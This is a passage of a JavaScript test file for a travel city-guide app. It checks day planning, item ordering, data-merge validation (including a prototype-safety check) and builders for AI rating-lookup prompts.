  assert.equal(C.normalizeState({ itemStatus: {}, tab: 'services' }).tab, 'services');
  assert.deepEqual(C.emptyState().collapsedPlanDays, {});
});
test('isPlanDayCollapsed/togglePlanDay: every remaining day starts expanded; toggling twice clears the override', () => {
  const st = C.emptyState();
  assert.equal(C.isPlanDayCollapsed(st, '2026-08-11'), false);
  C.togglePlanDay(st, '2026-08-11');
  assert.equal(C.isPlanDayCollapsed(st, '2026-08-11'), true);
  assert.equal(st.collapsedPlanDays['2026-08-11'], true);
  C.togglePlanDay(st, '2026-08-11');
  assert.equal(C.isPlanDayCollapsed(st, '2026-08-11'), false);
  assert.ok(!('2026-08-11' in st.collapsedPlanDays)); // override dropped, not just flipped
});
test('planModel: today groups every dated-today item across sections, same as todayModel', () => {
  const st = C.emptyState();
  const pm = C.planModel(GOOD, st, '2026-08-10');
  assert.equal(pm.todayIso, '2026-08-10');
  assert.equal(pm.inRange, true);
  assert.deepEqual(pm.today.map(e => e.it.id), ['tanini']);
});
test('planModel: every other day of the stay in order, excluding today, empty days included', () => {
  const st = C.emptyState();
  const pm = C.planModel(GOOD, st, '2026-08-10');
  assert.deepEqual(pm.days.map(d => d.iso),
    ['2026-08-08', '2026-08-09', '2026-08-11', '2026-08-12', '2026-08-13', '2026-08-14', '2026-08-15']);
  assert.deepEqual(pm.days.find(d => d.iso === '2026-08-13').items.map(e => e.it.id), ['brasserie']);
  assert.deepEqual(pm.days.find(d => d.iso === '2026-08-09').items, []); // nothing assigned: an empty day, not omitted
});
test('planModel: an item day-assigned from an Eat & Drink section still surfaces here (cross-tab)', () => {
  const st = C.emptyState();
  C.setDay(st, 'nord', '2026-08-09'); // nord is a coffee (Eat & Drink) item
  const pm = C.planModel(GOOD, st, '2026-08-10');
  assert.deepEqual(pm.days.find(d => d.iso === '2026-08-09').items.map(e => e.it.id), ['nord']);
});
test('planModel: open vs done tasks split, undated only (a dated task shows under its day instead)', () => {
  const st = C.emptyState();
  C.setStatus(st, 'old-errand', 'done'); // already done in the fixture's own data too
  const pm = C.planModel(WITH_TASKS, st, '2026-08-10');
  assert.deepEqual(pm.openTasks.map(e => e.it.id).sort(), ['book-train', 'buy-adapter']);
  assert.deepEqual(pm.doneTasks.map(e => e.it.id), ['old-errand']);
});
test('planModel: a dated task item shows in its day, not in openTasks (no double-count)', () => {
  const st = C.emptyState();
  C.setDay(st, 'buy-adapter', '2026-08-09');
  const pm = C.planModel(WITH_TASKS, st, '2026-08-10');
  assert.ok(!pm.openTasks.some(e => e.it.id === 'buy-adapter'));
  assert.deepEqual(pm.days.find(d => d.iso === '2026-08-09').items.map(e => e.it.id), ['buy-adapter']);
});

// ---- Plan tab: drag to reorder items inside a day (dayItemOrder) ----
function entry(id) { return { sec: { id: 's' }, it: { id: id }, status: 'plan' }; }

test('orderDayItems: no saved order leaves the day in its default order', () => {
  const day = [entry('a'), entry('b'), entry('c')];
  assert.deepEqual(C.orderDayItems(day, []).map(e => e.it.id), ['a', 'b', 'c']);
  assert.deepEqual(C.orderDayItems(day, null).map(e => e.it.id), ['a', 'b', 'c']);
});
test('orderDayItems: a saved order rearranges the day', () => {
  const day = [entry('a'), entry('b'), entry('c')];
  assert.deepEqual(C.orderDayItems(day, ['c', 'a', 'b']).map(e => e.it.id), ['c', 'a', 'b']);
});
test('orderDayItems: ids no longer on this day are ignored, not fatal', () => {
  const day = [entry('a'), entry('b')];
  assert.deepEqual(C.orderDayItems(day, ['gone', 'b', 'also-gone', 'a']).map(e => e.it.id), ['b', 'a']);
});
test('orderDayItems: an item the saved order never heard of keeps its default place at the end', () => {
  const day = [entry('a'), entry('b'), entry('new')];
  assert.deepEqual(C.orderDayItems(day, ['b', 'a']).map(e => e.it.id), ['b', 'a', 'new']);
});
test('orderDayItems: a duplicated id in the saved order places the item once', () => {
  const day = [entry('a'), entry('b')];
  assert.deepEqual(C.orderDayItems(day, ['b', 'b', 'a']).map(e => e.it.id), ['b', 'a']);
});
test('orderDayItems does not mutate the entries it is given', () => {
  const day = [entry('a'), entry('b')];
  C.orderDayItems(day, ['b', 'a']);
  assert.deepEqual(day.map(e => e.it.id), ['a', 'b']);
});
test('setDayItemOrder stores an arrangement, dedupes it, and drops an empty one', () => {
  const st = C.emptyState();
  C.setDayItemOrder(st, '2026-08-13', ['nord', 'brasserie', 'nord', '', null]);
  assert.deepEqual(st.dayItemOrder['2026-08-13'], ['nord', 'brasserie']);
  C.setDayItemOrder(st, '2026-08-13', []);
  assert.ok(!('2026-08-13' in st.dayItemOrder)); // back to the guide's own order
  assert.throws(() => C.setDayItemOrder(st, 'Thursday', ['nord']), /bad day/);
});
test('emptyState carries dayItemOrder and normalizeState backfills it for older saved state', () => {
  assert.deepEqual(C.emptyState().dayItemOrder, {});
  const old = C.normalizeState({ itemStatus: {}, itemDay: {}, dayOrder: {} }); // pre-feature state
  assert.deepEqual(old.dayItemOrder, {});
  const kept = C.normalizeState({ itemStatus: {}, dayItemOrder: { '2026-08-13': ['nord'] } });
  assert.deepEqual(kept.dayItemOrder['2026-08-13'], ['nord']);
});
test('planModel: a day reads its saved within-day order, across sections', () => {
  const st = C.emptyState();
  C.setDay(st, 'nord', '2026-08-13'); // coffee item joins the dinner item already there
  const before = C.planModel(GOOD, st, '2026-08-10');
  assert.deepEqual(before.days.find(d => d.iso === '2026-08-13').items.map(e => e.it.id),
    ['brasserie', 'nord']); // default: section order, then guide order
  C.setDayItemOrder(st, '2026-08-13', ['nord', 'brasserie']);
  const after = C.planModel(GOOD, st, '2026-08-10');
  assert.deepEqual(after.days.find(d => d.iso === '2026-08-13').items.map(e => e.it.id),
    ['nord', 'brasserie']);
});
test('planModel: today honors its own within-day order too', () => {
  const st = C.emptyState();
  C.setDay(st, 'nord', '2026-08-10'); // tanini is already on this date
  assert.deepEqual(C.planModel(GOOD, st, '2026-08-10').today.map(e => e.it.id), ['tanini', 'nord']);
  C.setDayItemOrder(st, '2026-08-10', ['nord', 'tanini']);
  assert.deepEqual(C.planModel(GOOD, st, '2026-08-10').today.map(e => e.it.id), ['nord', 'tanini']);
});
test('planModel: an arrangement whose item moved away still orders the rest', () => {
  const st = C.emptyState();
  C.setDay(st, 'nord', '2026-08-13');
  C.setDayItemOrder(st, '2026-08-13', ['nord', 'brasserie']);
  C.setDay(st, 'nord', '2026-08-14'); // dragged off to the next day
  const pm = C.planModel(GOOD, st, '2026-08-10');
  assert.deepEqual(pm.days.find(d => d.iso === '2026-08-13').items.map(e => e.it.id), ['brasserie']);
  assert.deepEqual(pm.days.find(d => d.iso === '2026-08-14').items.map(e => e.it.id), ['nord']);
});
// The export decision, as a test: a within-day arrangement is device/sync
// state, not guide data. See the comment above buildExport for why array
// position cannot carry it (the item array is section-major).
test('buildExport ignores dayItemOrder, and the round trip stays lossless with one saved', () => {
  const st = C.emptyState();
  C.setDay(st, 'nord', '2026-08-13');
  const plain = C.buildExport(GOOD, st);
  C.setDayItemOrder(st, '2026-08-13', ['nord', 'brasserie']);
  const arranged = C.buildExport(GOOD, st);
  assert.deepEqual(arranged, plain);
  const again = C.buildExport(C.parse(JSON.stringify(arranged)).data, C.emptyState());
  assert.deepEqual(again, arranged);
});

// QA follow-up: an integration guard against every bundled dataset (the
// freeform-schema fixtures the tab mapping has to handle), so a future
// section id added to a bundled guide can never silently orphan into no tab
// at all. tabForSection() always returns a string default ('info'), so the
// interesting failure mode is not "throws": it's a typo'd or renamed TABS id
// this test would catch by checking membership in the real, exported list.
function bundledCities() {
  const fs = require('fs');
  const path = require('path');
  const root = path.join(__dirname, '..');
  const manifest = JSON.parse(fs.readFileSync(path.join(root, 'cities', 'index.json'), 'utf8'));
  return manifest.cities.map(c =>
    JSON.parse(fs.readFileSync(path.join(root, 'cities', c.file), 'utf8')));
}
test('tabForSection resolves every bundled section (and so every item) to one of the five tabs', () => {
  const tabIds = C.TABS.map(t => t.id);
  bundledCities().forEach(city => {
    const secById = {};
    city.sections.forEach(s => { secById[s.id] = s; });
    city.sections.forEach(s => {
      const tab = C.tabForSection(s);
      assert.ok(tabIds.indexOf(tab) !== -1,
        `section "${s.id}" (${s.label}) resolved to "${tab}", not one of ${tabIds.join('/')}`);
    });
    city.items.forEach(it => {
      const sec = secById[it.section];
      assert.ok(sec, `item "${it.id}" references unknown section "${it.section}"`);
      const tab = C.tabForSection(sec);
      assert.ok(tabIds.indexOf(tab) !== -1,
        `item "${it.id}" (section "${it.section}") resolved to "${tab}", not one of ${tabIds.join('/')}`);
    });
  });
});

// --- Plan tab per-item day moves: the picker's pure model ---
// The move mechanism itself (setDay + keyForDisplayedDate) already had
// coverage; what was missing is the model that tells the renderer which day
// the item is ALREADY on, so that day can be shown but not offered as a tap
// that cannot change anything.
test('dayMoveOptions covers the whole stay and marks the day the item is on', () => {
  const st = C.emptyState();
  const brasserie = GOOD.items.find(i => i.id === 'brasserie'); // day 2026-08-13
  const m = C.dayMoveOptions(GOOD, st, brasserie);
  assert.equal(m.options.length, 8); // every date of the stay
  assert.equal(m.hasDay, true);
  assert.equal(m.currentIso, '2026-08-13');
  assert.ok(/\b13\b/.test(m.currentLabel), 'currentLabel should name the date: ' + m.currentLabel);
  const current = m.options.filter(o => o.current);
  assert.equal(current.length, 1);
  assert.equal(current[0].iso, '2026-08-13');
  // Every other date stays a live target.
  assert.equal(m.options.filter(o => !o.current).length, 7);
});
test('dayMoveOptions has no current day for an item with no day assigned', () => {
  const st = C.emptyState();
  const sisters = GOOD.items.find(i => i.id === 'sisters'); // backup, no day
  const m = C.dayMoveOptions(GOOD, st, sisters);
  assert.equal(m.hasDay, false);
  assert.equal(m.currentIso, null);
  assert.equal(m.currentLabel, null);
  assert.equal(m.options.filter(o => o.current).length, 0);
});
test('dayMoveOptions marks the DISPLAYED day, not the stored key, after a reorder', () => {
  // brasserie's stored day is Aug 13, but the reorder puts its group in the
  // Aug 10 slot: the traveler sees the card under Aug 10, so that is the day
  // the picker must call "current".
  const st = C.emptyState();
  st.dayOrder.dinner = ['2026-08-13', '2026-08-10'];
  const brasserie = GOOD.items.find(i => i.id === 'brasserie');
  const m = C.dayMoveOptions(GOOD, st, brasserie);
  assert.equal(m.currentIso, '2026-08-10');
  assert.equal(m.options.find(o => o.iso === '2026-08-10').key, '2026-08-13');
  assert.equal(m.options.filter(o => o.current).length, 1);
});
test('dayMoveOptions tracks an in-app move (state override beats the data day)', () => {
  const st = C.emptyState();
  const brasserie = GOOD.items.find(i => i.id === 'brasserie');
  C.setDay(st, 'brasserie', '2026-08-09');
  const m = C.dayMoveOptions(GOOD, st, brasserie);
  assert.equal(m.currentIso, '2026-08-09');
  assert.equal(m.options.filter(o => o.current).length, 1);
});
test('dayMoveOptions respects an adjusted stay range', () => {
  const st = C.emptyState();
  C.setStayDates(st, '2026-08-09', '2026-08-11');
  const brasserie = GOOD.items.find(i => i.id === 'brasserie'); // Aug 13, now outside
  const m = C.dayMoveOptions(GOOD, st, brasserie);
  assert.equal(m.options.length, 3);
  assert.equal(m.hasDay, true);
  assert.equal(m.currentIso, null); // its day is off the shortened stay: nothing to mark
});
// Integration guard on the bundled data: every dated item must offer exactly
// one marked current day and the rest of the stay as live targets, whatever
// section it lives in.
test('dayMoveOptions works for every dated item in every bundled guide', () => {
  bundledCities().forEach(city => {
    const st = C.emptyState();
    const stayDays = Math.round((Date.parse(city.city.dates.to) -
      Date.parse(city.city.dates.from)) / 86400000) + 1;
    const dated = city.items.filter(i => i.day && (i.status === 'plan' || i.status === 'done'));
    assert.ok(dated.length > 0);
    dated.forEach(it => {
      const m = C.dayMoveOptions(city, st, it);
      assert.equal(m.options.length, stayDays, `${it.id}: expected the ${stayDays}-day stay`);
      assert.equal(m.hasDay, true, `${it.id}: should read as dated`);
      assert.equal(m.options.filter(o => o.current).length, 1,
        `${it.id}: expected exactly one current day, got ${m.options.filter(o => o.current).length}`);
      assert.equal(m.currentIso, it.day, `${it.id}: current day should be its own date`);
      assert.equal(m.options.filter(o => !o.current).length, stayDays - 1,
        `${it.id}: expected ${stayDays - 1} live targets`);
    });
  });
});

// --- Composite daily-plan split (tools/split-plans.js) ---
// The transform that turns "one item per day, everything packed into the
// note" entries into individually movable items. City-specific split specs
// live with the private city data, out of this repo; the two pure pieces
// below are what any city (or a re-run after an Enrich pass reintroduces a
// composite) leans on.
const SPLIT = require('../tools/split-plans');

test('parseFragments splits a composite note on the separator and keeps the phase', () => {
  const f = SPLIT.parseFragments('AM: Coolab day pass · PM: Barber 919 · Eve: Era Blloku');
  assert.equal(f.length, 3);
  assert.deepEqual(f[0], { phase: 'AM', text: 'Coolab day pass' });
  assert.deepEqual(f[1], { phase: 'PM', text: 'Barber 919' });
  assert.deepEqual(f[2], { phase: 'Eve', text: 'Era Blloku' });
});

// The real notes only prefix the FIRST fragment of a run, so an unprefixed
// fragment belongs to the phase before it, not to no phase at all. Getting
// this wrong would silently drop "laundry" out of Tuesday afternoon.
test('parseFragments carries the phase forward across unprefixed fragments', () => {
  const f = SPLIT.parseFragments('AM: market run · PM: Work block · laundry · Eve: dinner');
  assert.deepEqual(f.map(x => x.phase), ['AM', 'PM', 'PM', 'Eve']);
  assert.deepEqual(f.map(x => x.text), ['market run', 'Work block', 'laundry', 'dinner']);
});

test('parseFragments leaves a leading unphased fragment unphased, and drops blanks', () => {
  const f = SPLIT.parseFragments('  wander  ·   · PM: nap ·  ');
  assert.deepEqual(f, [{ phase: null, text: 'wander' }, { phase: 'PM', text: 'nap' }]);
});

test('parseFragments tolerates a missing or non-string note', () => {
  assert.deepEqual(SPLIT.parseFragments(''), []);
  assert.deepEqual(SPLIT.parseFragments(undefined), []);
  assert.deepEqual(SPLIT.parseFragments(null), []);
  assert.deepEqual(SPLIT.parseFragments(42), []);
});

const SPLIT_SPEC = {
  dissolve: ['tanini'],
  merge: [{ id: 'brasserie', when: 'Eve', noteAppend: 'Fallback: Tanini.' },
    { id: 'nord', day: '2026-08-11', when: 'AM' }],
  create: [{ item: { id: 'work-block', section: 'coffee', status: 'plan', name: 'Work block', day: '2026-08-11' } }]
};

test('applySplit dissolves, merges and creates in one pass', () => {
  const out = SPLIT.applySplit(GOOD, SPLIT_SPEC);
  assert.equal(out.items.find(i => i.id === 'tanini'), undefined, 'composite should be gone');
  const br = out.items.find(i => i.id === 'brasserie');
  assert.equal(br.when, 'Eve');
  assert.ok(br.note.endsWith('Fallback: Tanini.'), br.note);
  const nord = out.items.find(i => i.id === 'nord');
  assert.equal(nord.day, '2026-08-11'); // gained a day it did not have
  const wb = out.items.find(i => i.id === 'work-block');
  assert.equal(wb.name, 'Work block');
  assert.equal(out.items.length, GOOD.items.length); // minus one, plus one
});

// The surviving items are the ones the traveler's local state is keyed to.
// A merge that renamed or re-slugged an id would silently orphan their
// statuses, renames and day moves.
test('applySplit never changes a surviving item id, and leaves the input alone', () => {
  const before = JSON.stringify(GOOD);
  const out = SPLIT.applySplit(GOOD, SPLIT_SPEC);
  assert.equal(JSON.stringify(GOOD), before, 'input must not be mutated');
  ['brasserie', 'sisters', 'nord'].forEach(id => {
    assert.ok(out.items.some(i => i.id === id), id + ' should survive with its id');
  });
});

test('applySplit does not append the same note twice when re-run', () => {
  const once = SPLIT.applySplit(GOOD, SPLIT_SPEC);
  const twice = SPLIT.applySplit(once, { merge: SPLIT_SPEC.merge });
  const n = twice.items.find(i => i.id === 'brasserie').note;
  assert.equal(n.split('Fallback: Tanini.').length - 1, 1, n);
});

test('applySplit refuses a spec that has drifted from the data', () => {
  assert.throws(() => SPLIT.applySplit(GOOD, { dissolve: ['nope'] }), /dissolve target not found/);
  assert.throws(() => SPLIT.applySplit(GOOD, { merge: [{ id: 'nope', when: 'AM' }] }), /merge target not found/);
  assert.throws(() => SPLIT.applySplit(GOOD, {
    create: [{ item: { id: 'nord', section: 'coffee', status: 'plan', name: 'Dup' } }]
  }), /collides with an existing item/);
  assert.throws(() => SPLIT.applySplit(GOOD, {
    create: [{ item: { id: 'x', section: 'nosuch', status: 'plan', name: 'X' } }]
  }), /unknown section/);
});

// The pipeline half of the fix: a future city has to arrive pre-split.
test('PROMPT.md forbids the packed per-day item, inside the sliced item contract', () => {
  const fs = require('fs');
  const path = require('path');
  const prompt = fs.readFileSync(path.join(__dirname, '..', 'PROMPT.md'), 'utf8');
  const block = C.promptKit.sliceLandmark
    ? C.promptKit.sliceLandmark(prompt, 'CONTRACT:ITEM')
    : prompt.split('CONTRACT:ITEM')[1];
  assert.ok(/One item is one thing the traveler does/.test(block),
    'the no-composite rule must live INSIDE CONTRACT:ITEM so the delta prompts carry it too');
  assert.ok(/own `day`/.test(block));
});

test('orderDayItems sinks done items below active, stable both sides', () => {
  const mk = (id, status) => ({ it: { id: id }, sec: {}, status: status });
  const entries = [mk('a', 'done'), mk('b', 'plan'), mk('c', 'done'), mk('d', 'plan')];
  assert.deepEqual(C.orderDayItems(entries, null).map(e => e.it.id), ['b', 'd', 'a', 'c']);
  // custom order applies within the bands: order lists c,b,a,d
  assert.deepEqual(C.orderDayItems(entries, ['c', 'b', 'a', 'd']).map(e => e.it.id), ['b', 'd', 'c', 'a']);
  // un-done returns to its ordered place
  const undone = entries.map(e => e.it.id === 'a' ? mk('a', 'plan') : e);
  assert.deepEqual(C.orderDayItems(undone, ['c', 'b', 'a', 'd']).map(e => e.it.id), ['b', 'a', 'd', 'c']);
});
test('orderDayItems maps are prototype-safe', () => {
  const mk = (id, status) => ({ it: { id: id }, sec: {}, status: status });
  const entries = [mk('__proto__', 'plan'), mk('valueOf', 'plan'), mk('x', 'plan')];
  const out = C.orderDayItems(entries, ['valueOf', '__proto__']);
  assert.deepEqual(out.map(e => e.it.id), ['valueOf', '__proto__', 'x']);
  assert.equal(({}).it, undefined);
});

test('whenClock ranks dayparts and explicit times', () => {
  assert.equal(C.whenClock('AM, coffee crawl 1 of 2'), 540);
  assert.equal(C.whenClock('Eve, seafood'), 1170);
  assert.equal(C.whenClock('PM'), 900);
  assert.equal(C.whenClock('leave 08:45 for the terminal'), 525);
  assert.equal(C.whenClock('lunch after the market'), 720);
  assert.equal(C.whenClock(undefined), 780);
  assert.equal(C.whenClock('tram to Blloku'), 780); // no false am-match inside words
});
test('orderDayItems defaults to chronological, drag order still overrides', () => {
  const mk = (id, when) => ({ it: { id: id, when: when }, sec: {}, status: 'plan' });
  const day = [mk('work', 'PM'), mk('fish', 'Eve, seafood'), mk('coffee', 'AM, crawl'), mk('bus', 'leave 08:45')];
  assert.deepEqual(C.orderDayItems(day, null).map(e => e.it.id), ['bus', 'coffee', 'work', 'fish']);
  assert.deepEqual(C.orderDayItems(day, ['fish', 'work']).map(e => e.it.id), ['fish', 'work', 'bus', 'coffee']);
});

// ---- structured ratings ----
// The rating is the one field the traveler reads at a glance to choose
// between two places, so every entry path (whole guide, new delta item,
// ratings map) is held to the same bar and the bad shapes are named.
test('validate accepts a well-formed rating and every optional field', () => {
  const ok = clone(GOOD);
  ok.items[0].rating = { stars: 4.8, count: 5545, source: 'Google Maps, Aug 2026', checked: '2026-08-25' };
  ok.items[1].rating = { stars: 5 };                       // stars alone is enough
  ok.items[2].rating = { stars: 0, count: 0, source: null, checked: null };
  assert.deepEqual(C.validate(ok), []);
});

test('validate rejects every bad rating shape by name', () => {
  function errsFor(rating) {
    const bad = clone(GOOD);
    bad.items[0].rating = rating;
    return C.validate(bad);
  }
  assert.ok(errsFor([4.8]).some((e) => /rating: must be an object/.test(e)));
  assert.ok(errsFor('4.8 stars').some((e) => /rating: must be an object/.test(e)));
  assert.ok(errsFor({}).some((e) => /rating: stars must be a number from 0 to 5/.test(e)));
  assert.ok(errsFor({ stars: '4.8' }).some((e) => /stars must be a number from 0 to 5/.test(e)));
  assert.ok(errsFor({ stars: 5.4 }).some((e) => /stars must be a number from 0 to 5/.test(e)));
  assert.ok(errsFor({ stars: -1 }).some((e) => /stars must be a number from 0 to 5/.test(e)));
  assert.ok(errsFor({ stars: NaN }).some((e) => /stars must be a number from 0 to 5/.test(e)));
  assert.ok(errsFor({ stars: 4.8, count: 12.5 }).some((e) => /count must be a whole number, 0 or more/.test(e)));
  assert.ok(errsFor({ stars: 4.8, count: '442' }).some((e) => /count must be a whole number, 0 or more/.test(e)));
  assert.ok(errsFor({ stars: 4.8, count: -3 }).some((e) => /count must be a whole number, 0 or more/.test(e)));
  assert.ok(errsFor({ stars: 4.8, source: 12 }).some((e) => /rating: source must be a string/.test(e)));
  assert.ok(errsFor({ stars: 4.8, checked: 'Aug 2026' }).some((e) => /rating: checked must be YYYY-MM-DD/.test(e)));
  // The error names the item, exactly like every other item-level error.
  assert.ok(errsFor({ stars: 9 }).some((e) => /^items\[0\] \(brasserie\) rating:/.test(e)));
  // null and absent are both "no rating", never an error.
  assert.deepEqual(errsFor(null), []);
});

test('mergeDelta accepts a rating on a new item, held to the same bar', () => {
  const delta = { schema: 1, delta: true, items: [
    { id: 'nova', section: 'dinner', status: 'plan', name: 'Nova', links: [],
      rating: { stars: 4.6, count: 210, source: 'Google Maps, Aug 2026', checked: '2026-08-25' } }
  ] };
  const r = C.mergeDelta(GOOD, delta);
  assert.deepEqual(r.errors, []);
  assert.deepEqual(r.data.items[4].rating,
    { stars: 4.6, count: 210, source: 'Google Maps, Aug 2026', checked: '2026-08-25' });
  const badItem = { schema: 1, delta: true, items: [
    { id: 'nova', section: 'dinner', status: 'plan', name: 'Nova', links: [], rating: { stars: 7 } }
  ] };
  const bad = C.mergeDelta(GOOD, badItem);
  assert.equal(bad.data, null);
  assert.ok(bad.errors.some((e) => /items\[0\] \(nova\) rating: stars must be a number from 0 to 5/.test(e)));
});

test('mergeDelta ratings map applies to existing items and counts unknown ids as skipped', () => {
  const delta = { schema: 1, delta: true, ratings: {
    brasserie: { stars: 4.8, count: 1216, source: 'Google Maps, Aug 2026', checked: '2026-08-25' },
    nord: { stars: 4.4 },
    'vanished-place': { stars: 4.9, count: 12 }
  } };
  const r = C.mergeDelta(GOOD, delta);
  assert.deepEqual(r.errors, []);
  assert.equal(r.summary.ratingsApplied, 2);
  assert.equal(r.summary.ratingsSkipped, 1);
  const byId = {};
  r.data.items.forEach((i) => { byId[i.id] = i; });
  assert.equal(byId.brasserie.rating.count, 1216);
  assert.equal(byId.nord.rating.stars, 4.4);
  assert.equal(byId.tanini.rating, undefined);
  // Nothing else on the item moved: a ratings pass touches `rating` only.
  assert.equal(byId.brasserie.note, GOOD.items[0].note);
  assert.equal(byId.brasserie.price.text, GOOD.items[0].price.text);
  // Pure: the input city is untouched and the map is deep-copied, not aliased.
  assert.equal(GOOD.items[0].rating, undefined);
  delta.ratings.brasserie.stars = 1;
  assert.equal(byId.brasserie.rating.stars, 4.8);
});

test('mergeDelta ratings applied twice REPLACES and counts as applied, not skipped', () => {
  // A rating is a reading taken on a date. Re-running the pass is how the
  // number stays current, so the second run must overwrite the first and
  // report the work it did; skipped is reserved for ids this guide lacks.
  const first = C.mergeDelta(GOOD, { schema: 1, delta: true,
    ratings: { brasserie: { stars: 4.8, count: 1216, checked: '2026-07-01' } } });
  const second = C.mergeDelta(first.data, { schema: 1, delta: true,
    ratings: { brasserie: { stars: 4.6, count: 1290, checked: '2026-08-25' } } });
  assert.deepEqual(second.errors, []);
  assert.equal(second.summary.ratingsApplied, 1);
  assert.equal(second.summary.ratingsSkipped, 0);
  assert.deepEqual(second.data.items[0].rating, { stars: 4.6, count: 1290, checked: '2026-08-25' });
  // Replacement, not a field-by-field merge: last month's count cannot
  // survive next to this month's stars.
  const third = C.mergeDelta(second.data, { schema: 1, delta: true,
    ratings: { brasserie: { stars: 4.7 } } });
  assert.deepEqual(third.data.items[0].rating, { stars: 4.7 });
});

test('mergeDelta ratings map is prototype-safe and rejects bad shapes', () => {
  // JSON.parse, not an object literal: a literal `__proto__:` key SETS the
  // prototype instead of creating an own property, so a literal would test
  // nothing. A pasted delta arrives through JSON.parse, and that is the
  // route that really does hand mergeDelta an own "__proto__" key.
  const hostile = C.mergeDelta(GOOD, JSON.parse('{"schema":1,"delta":true,"ratings":' +
    '{"__proto__":{"stars":5},"constructor":{"stars":5},"hasOwnProperty":{"stars":5},' +
    '"brasserie":{"stars":4.1}}}'));
  assert.deepEqual(hostile.errors, []);
  // No reserved key reaches an item, and nothing is painted onto Object.
  assert.equal(hostile.summary.ratingsApplied, 1);
  assert.equal(hostile.summary.ratingsSkipped, 3);
  assert.equal(({}).rating, undefined);
  assert.equal(({}).stars, undefined);
  hostile.data.items.forEach((it) => {
    if (it.id !== 'brasserie') assert.equal(it.rating, undefined);
  });
  const arr = C.mergeDelta(GOOD, { schema: 1, delta: true, ratings: [{ stars: 4 }] });
  assert.equal(arr.data, null);
  assert.ok(arr.errors.some((e) => /ratings must be an object keyed by item id/.test(e)));
  const badEntry = C.mergeDelta(GOOD, { schema: 1, delta: true, ratings: { nord: { stars: 'nine' } } });
  assert.equal(badEntry.data, null);
  assert.ok(badEntry.errors.some((e) => /ratings\["nord"\]: stars must be a number from 0 to 5/.test(e)));
  // Errors mean NO merge at all, ratings included.
  assert.deepEqual(badEntry.summary, { added: 0, skipped: 0, sectionsAdded: 0, intelApplied: 0,
    intelSkipped: 0, ratingsApplied: 0, ratingsSkipped: 0 });
});

test('mergeDelta applies intel and ratings in one payload without either disturbing the other', () => {
  const r = C.mergeDelta(GOOD, { schema: 1, delta: true,
    intel: { brasserie: { verdicts: [{ tier: 'must', text: 'The duck' }] } },
    ratings: { brasserie: { stars: 4.8 }, nowhere: { stars: 4.0 } } });
  assert.deepEqual(r.errors, []);
  assert.equal(r.summary.intelApplied, 1);
  assert.equal(r.summary.intelSkipped, 0);
  assert.equal(r.summary.ratingsApplied, 1);
  assert.equal(r.summary.ratingsSkipped, 1);
  assert.equal(r.data.items[0].intel.verdicts[0].text, 'The duck');
  assert.equal(r.data.items[0].rating.stars, 4.8);
});

test('buildRatingsPassPrompt lists the items still in play and nothing else', () => {
  const city = clone(GOOD);
  city.items.push({ id: 'gone', section: 'dinner', status: 'archived', name: 'Closed Place', links: [] });
  city.items.push({ id: 'eaten', section: 'dinner', status: 'done', name: 'Already Been', links: [] });
  const out = C.promptKit.buildRatingsPassPrompt(FAKE_RERUN, city);
  assert.ok(out.startsWith('You are refreshing the Google Maps ratings on an existing CityOps city guide.'));
  assert.ok(out.includes('- **City:** Batumi'));
  assert.ok(out.includes('Look up the CURRENT Google Maps rating for each item listed below.'));
  assert.equal(out.indexOf('RERUN:RATINGS'), -1);
  assert.ok(out.includes('## Items'));
  assert.ok(out.includes('- brasserie | dinner | Brasserie 1900'));   // plan
  assert.ok(out.includes('- sisters | dinner | At the Sisters'));     // backup
  assert.equal(out.indexOf('- gone | dinner | Closed Place'), -1);    // archived
  assert.equal(out.indexOf('- eaten | dinner | Already Been'), -1);   // done
  assert.ok(out.includes('Each `- ` line above is `id | section | name`.'));
  // Not an intel pass and not an interests pass: neither block belongs here.
  assert.equal(out.indexOf('## Intel quality rules'), -1);
  assert.equal(out.indexOf('## Traveler interests'), -1);
  // Pure, like its two siblings.
  const snap = JSON.stringify(city);
  C.promptKit.buildRatingsPassPrompt(FAKE_RERUN, city);
  assert.equal(JSON.stringify(city), snap);
  assert.throws(() => C.promptKit.buildRatingsPassPrompt('# nothing here', GOOD), /no RERUN:RATINGS block/);
});

test('the real PROMPT.md builds a ratings pass that says look it up, never guess', () => {
  const fs = require('fs');
  const path = require('path');
  const prompt = fs.readFileSync(path.join(__dirname, '..', 'PROMPT.md'), 'utf8');
  const out = C.promptKit.buildRatingsPassPrompt(prompt, GOOD);
  assert.ok(out.includes('Never guess, never carry a number forward from memory.'));
  assert.ok(out.includes('Omit any item you cannot verify.'));
  assert.ok(out.includes('"ratings": {'));
  assert.ok(out.includes('- brasserie | dinner | Brasserie 1900'));
  // The generation contract must tell the AI to emit `rating` rather than
  // bury the number in the note, or the badge is empty on every new guide.
  const contract = prompt.slice(prompt.indexOf('<' + '!-- CONTRACT:ITEM -->'),
    prompt.indexOf('<' + '!-- /CONTRACT:ITEM -->'));
  assert.ok(/`rating` is optional on any item and is the ONLY place a rating belongs/.test(contract),
    'the rating rule must live INSIDE CONTRACT:ITEM so the delta prompts carry it too');
});

// ---- Section tabs: chronological default, done at the bottom, drag override ----
// The section-tab twin of the Plan tab's orderDayItems. Entries here are
// {it, dayIso, status} rows, since a section spans the whole trip.
function secEntry(id, dayIso, when, status) {
  return { it: { id: id, when: when }, dayIso: dayIso || null, status: status || 'plan' };
}

test('orderSectionItems runs dated items in date order, undated last', () => {
  const out = C.orderSectionItems([
    secEntry('u1', null),
    secEntry('wed', '2026-08-12'),
    secEntry('u2', null),
    secEntry('mon', '2026-08-10')
  ], []).map((e) => e.it.id);
  assert.deepEqual(out, ['mon', 'wed', 'u1', 'u2']);
});

test('orderSectionItems sorts one date by whenClock, exactly as a Plan day does', () => {
  const out = C.orderSectionItems([
    secEntry('eve', '2026-08-10', 'Dinner'),
    secEntry('am', '2026-08-10', 'Morning coffee'),
    secEntry('clock', '2026-08-10', 'leave 08:45'),
    secEntry('pm', '2026-08-10', 'Afternoon')
  ], []).map((e) => e.it.id);
  assert.deepEqual(out, ['clock', 'am', 'pm', 'eve']);
});

test('orderSectionItems keeps undated items in the guide order, never re-sorted', () => {
  const out = C.orderSectionItems([
    secEntry('zeta', null, 'Evening'),
    secEntry('alpha', null, 'Morning')
  ], []).map((e) => e.it.id);
  assert.deepEqual(out, ['zeta', 'alpha']);
});

test('orderSectionItems sinks done items to the bottom, stable on both sides', () => {
  const out = C.orderSectionItems([
    secEntry('a', '2026-08-10', null, 'done'),
    secEntry('b', '2026-08-11'),
    secEntry('c', '2026-08-12', null, 'done'),
    secEntry('d', '2026-08-13')
  ], []).map((e) => e.it.id);
